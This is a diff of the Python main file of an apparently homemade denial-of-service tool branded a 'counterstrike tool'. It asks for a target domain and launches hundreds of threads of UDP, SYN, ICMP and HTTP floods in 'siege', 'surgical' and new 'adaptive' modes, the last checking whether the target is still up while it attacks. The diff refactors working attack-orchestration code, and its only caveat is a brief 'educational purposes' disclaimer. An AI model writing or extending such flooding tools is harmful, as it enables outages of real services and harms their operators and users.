@@ -1,141 +1,158 @@
+# main.py
+
 import threading
+import time
+import socket
 import counter_strike_helper
 
 
-def full_scale_counter_strike(target):
-    """
-    Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
-    This is a siege designed to run for a long time.
-    """
-    print("=" * 60)
-    print("MODE: FULL SCALE COUNTER-STRIKE (SIEGE)")
-    print("This will launch hundreds of attack threads for a long duration.")
-    print("=" * 60)
+def launch_attack_thread(target_func, args_tuple):
+    """Helper to create, start, and return a daemon thread."""
+    thread = threading.Thread(target=target_func, args=args_tuple)
+    thread.daemon = True
+    thread.start()
+    return thread
 
+
+def full_scale_counter_strike(target):
+    """Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack."""
+    print("=" * 60 + "\nMODE: FULL SCALE COUNTER-STRIKE (SIEGE)\n" + "=" * 60)
+    stop_event, pause_event = threading.Event(), threading.Event()
     attack_threads = []
 
-    # --- Parameters for a long-running siege ---
-    udp_attacks = [("UDP-Mix", 53, 360), ("UDP-Mix", 443, 360), ("UDP-Mix", 123, 360)]
-    syn_ports = [80, 443, 25, 587, 465, 143, 993, 22, 3389, 3306, 5432, 1433]
-    syn_packet_count = 200000
-    icmp_packet_count = 200000
-    http_ports = [80, 443, 8080, 8000, 8443]
-    http_request_count = 50000
+    # --- Parameters for a long-running, high-intensity siege ---
+    params = {
+        "threads": 250,  # <-- HIGH thread count for maximum intensity
+        "udp_duration": 360,
+        "syn_duration": 300,
+        "icmp_duration": 300,
+        "http_duration": 300,
+    }
+    print(f"[CONFIG] Siege mode: Using {params['threads']} threads per attack vector.")
 
-    # --- Create and Launch Threads (Logic is the same, parameters differ) ---
-    print("[*] Preparing UDP flood threads (Duration: 360s)...")
-    for method, port, duration in udp_attacks:
-        thread = threading.Thread(target=counter_strike_helper.attack_UDP, args=(method, target, port, duration))
-        attack_threads.append(thread)
-    # The 0-1024 scan is unique to the full-scale attack
-    for i in range(0, 1025):
-        thread = threading.Thread(target=counter_strike_helper.attack_UDP, args=("UDP-Mix", target, i, 360))
-        attack_threads.append(thread)
+    # Launch UDP attacks
+    for port in [53, 443, 123]:
+        args = ("UDP-Mix", target, port, params["udp_duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
+    # Full port range scan
+    for i in range(1025):
+        args = ("UDP-Mix", target, i, params["udp_duration"], stop_event, pause_event, 5)  # Lower threads for the scan
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
 
-    print("[*] Preparing SYN flood threads...")
-    for port in syn_ports:
-        thread = threading.Thread(target=counter_strike_helper.synflood, args=(target, port, syn_packet_count))
-        attack_threads.append(thread)
+    # Launch SYN attacks
+    for port in [80, 443, 22, 3389, 25, 587, 3306, 5432]:
+        args = (target, port, params["syn_duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
 
-    print("[*] Preparing ICMP flood thread...")
-    thread = threading.Thread(target=counter_strike_helper.icmpflood, args=(target, icmp_packet_count))
-    attack_threads.append(thread)
+    # Launch ICMP attack
+    args = (target, params["icmp_duration"], stop_event, pause_event, params["threads"])
+    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
 
-    print("[*] Preparing HTTP flood threads...")
-    for port in http_ports:
-        thread = threading.Thread(target=counter_strike_helper.attack_http_flood,
-                                  args=(target, port, http_request_count))
-        attack_threads.append(thread)
+    # Launch HTTP attacks
+    for port in [80, 443, 8080, 8443]:
+        args = (target, port, params["http_duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_flood, args))
 
-    launch_and_wait(attack_threads)
+    print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
+    try:
+        while any(t.is_alive() for t in attack_threads): time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received. Signaling all threads to stop...")
+        stop_event.set()
 
 
 def fast_scale_counter_strike(target):
-    """
-    Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
-    This is a surgical strike designed for maximum impact in a short time.
-    """
-    print("=" * 60)
-    print("MODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)")
-    print("This will launch a focused, high-intensity attack for a short duration.")
-    print("=" * 60)
-
+    """Launches a FAST, INTENSE, blended, multi-threaded counter-attack."""
+    print("=" * 60 + "\nMODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)\n" + "=" * 60)
+    stop_event, pause_event = threading.Event(), threading.Event()
     attack_threads = []
 
-    # --- Parameters for a short, high-impact burst ---
-    udp_duration = 60  # Attack for 60 seconds
-    syn_packet_count = 75000
-    icmp_packet_count = 75000
-    http_request_count = 25000
+    # --- Parameters for a short, focused burst ---
+    params = {
+        "threads": 100,  # <-- MODERATE thread count for a focused burst
+        "duration": 60,
+    }
+    print(f"[CONFIG] Surgical mode: Using {params['threads']} threads per attack vector.")
 
-    # Focus on the most critical services
-    udp_attacks = [("UDP-Mix", 53, udp_duration), ("UDP-Mix", 443, udp_duration)]
-    syn_ports = [80, 443, 22, 3389]  # Web, SSH, RDP
-    http_ports = [80, 443, 8080]  # Standard Web Ports
+    # Launch focused attacks
+    for port in [53, 443]:  # UDP
+        args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
+    for port in [80, 443, 22, 3389]:  # SYN
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
+    # ICMP
+    args = (target, params["duration"], stop_event, pause_event, params["threads"])
+    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
+    for port in [80, 443]:  # HTTP
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_flood, args))
 
-    # --- Create Threads for Each Focused Attack ---
-    print(f"[*] Preparing UDP flood threads (Duration: {udp_duration}s)...")
-    for method, port, duration in udp_attacks:
-        thread = threading.Thread(target=counter_strike_helper.attack_UDP, args=(method, target, port, duration))
-        attack_threads.append(thread)
-
-    print("[*] Preparing SYN flood threads on critical ports...")
-    for port in syn_ports:
-        thread = threading.Thread(target=counter_strike_helper.synflood, args=(target, port, syn_packet_count))
-        attack_threads.append(thread)
-
-    print("[*] Preparing ICMP flood thread...")
-    thread = threading.Thread(target=counter_strike_helper.icmpflood, args=(target, icmp_packet_count))
-    attack_threads.append(thread)
-
-    print("[*] Preparing HTTP flood threads on critical ports...")
-    for port in http_ports:
-        thread = threading.Thread(target=counter_strike_helper.attack_http_flood,
-                                  args=(target, port, http_request_count))
-        attack_threads.append(thread)
-
-    launch_and_wait(attack_threads)
-
-
-def launch_and_wait(attack_threads):
-    """
-    Helper function to launch and manage a list of attack threads.
-    This avoids code repetition.
-    """
-    print("\n[+] All attack vectors prepared. Launching blended attack now!")
-    print(f"[i] Total threads to launch: {len(attack_threads)}")
-
-    # Start all the threads
-    for thread in attack_threads:
-        thread.daemon = True
-        thread.start()
-
-    # Wait for all threads to complete
+    print(f"[+] Fast-scale attack launched. Running for {params['duration']} seconds. Press Ctrl+C to stop.")
     try:
-        print("[i] Attack is running. Press Ctrl+C to attempt an early stop.")
-        # The .join() here will block the main script until the thread finishes.
-        for thread in attack_threads:
-            thread.join()
-        print("\n[+] All attack threads have completed their tasks.")
+        time.sleep(params["duration"])
     except KeyboardInterrupt:
-        print("\n[!] Keyboard interrupt received. The script will now exit.")
-        # Daemon threads will be terminated automatically.
+        print("\n[!] Keyboard interrupt received.")
+    finally:
+        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
+        stop_event.set()
 
 
-# --- Main Execution Block ---
+def adaptive_strike(target):
+    """Launches a 'Fast Scale' attack profile managed by an adaptive controller."""
+    print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
+    try:
+        check_port = int(input("Enter the port to monitor for target status (e.g., 80 or 443): "))
+        check_interval = int(input("Enter the status check interval in seconds (e.g., 15): "))
+        total_duration = int(input("Enter the total attack duration in seconds (e.g., 600): "))
+        threads = int(input("Enter number of threads per attack vector (e.g., 150): "))
+        target_ip = socket.gethostbyname(target)
+    except (ValueError, socket.gaierror) as e:
+        print(f"[!] Invalid input or could not resolve host: {e}. Aborting.")
+        return
+
+    stop_event, pause_event = threading.Event(), threading.Event()
+
+    # Use the same focused profile as "Fast Scale" but with user-defined parameters
+    attack_profile = [
+        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 443, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.synflood, (target, 443, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.icmpflood, (target, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_http_flood, (target, 80, total_duration, stop_event, pause_event, threads)),
+    ]
+
+    for func, args in attack_profile:
+        launch_attack_thread(func, args)
+
+    # Launch the adaptive controller
+    controller_args = (target_ip, check_port, stop_event, pause_event, check_interval)
+    launch_attack_thread(counter_strike_helper.adaptive_attack_controller, controller_args)
+
+    print(f"[+] Adaptive attack launched. Total duration: {total_duration}s. Press Ctrl+C to stop.")
+    try:
+        time.sleep(total_duration)
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received.")
+    finally:
+        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
+        stop_event.set()
+        time.sleep(2)
+
+
+# --- Main execution block remains the same ---
 if __name__ == "__main__":
-    print("-" * 60)
-    print("WELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL")
-    print("-" * 60)
+    print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
     target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
-    print(f"Target: {target_domain}")
 
     try:
         options_text = """
 Select an attack profile:
-  1: Full Scale Counterstrike (Long-running siege, all vectors)
-  2: Fast Counterstrike (Short, intense, focused attack)
+  1: Full Scale Counterstrike (Long-running siege)
+  2: Fast Counterstrike (Short, intense burst)
+  3: Adaptive Counterstrike (Smart, responsive attack)
 
 Please enter your option: """
         options = int(input(options_text))
@@ -144,10 +161,12 @@ Please enter your option: """
             full_scale_counter_strike(target_domain)
         elif options == 2:
             fast_scale_counter_strike(target_domain)
+        elif options == 3:
+            adaptive_strike(target_domain)
         else:
             print("Invalid option selected. Exiting.")
 
     except ValueError:
-        print("Invalid input. Please enter a number (1 or 2).")
+        print("Invalid input. Please enter a number.")
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
